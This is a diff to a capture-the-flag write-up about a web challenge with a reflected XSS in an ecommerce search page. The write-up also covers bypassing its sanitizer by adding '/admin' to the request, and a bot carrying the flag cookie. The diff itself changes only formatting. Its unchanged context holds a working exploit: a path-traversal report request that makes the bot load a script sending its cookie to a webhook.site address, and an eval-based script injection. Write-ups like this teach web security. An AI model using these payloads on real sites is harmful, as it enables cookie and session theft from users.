@@ -10,16 +10,15 @@ Author: Stefano Alberto <@Xato>
 
 ## Overview
 
-The challenge consists of a simple ecommerce website that allows users to view and search a list of items. 
+The challenge consists of a simple ecommerce website that allows users to view and search a list of items.
 
 Additionally, the application exposes an administration interface that requires access with an unknown password to modify the items.
 
 Finally, it is possible to have one of the available items on the website visited by a bot that has the flag as a cookie
 
-
 ## XSS
 
-The search functionality is vulnerable to a trivial XSS, the searched value is in fact reflected in the page without HTML escaping. 
+The search functionality is vulnerable to a trivial XSS, the searched value is in fact reflected in the page without HTML escaping.
 
 However, the application is protected by a sanitizer, which automatically removes malicious HTML tags from the parameters sent to the server.
 
@@ -56,7 +55,6 @@ By making the bot visit an arbitrary path, we can exploit XSS on the search func
 An example of a payload that can be used to send the cookie to a webhook is given.
 Note how it is necessary to include the string `/admin` also in the request to the endpoint to make the report, so that our payload is not sanitized.
 
-
 ```
 POST /report?/admin HTTP/1.1
 Host: localhost:3000
@@ -69,7 +67,7 @@ id=1%2f..%2f..%2fsearch%3ffetch(%60https%3a%2f%2fwebhook.site%2fYOUR-WEBHOOK-HER
 
 Triggering the bot to execute the following script.
 
-```
+```html
 <script>eval(location.search.slice(1))</script>
 ```
 
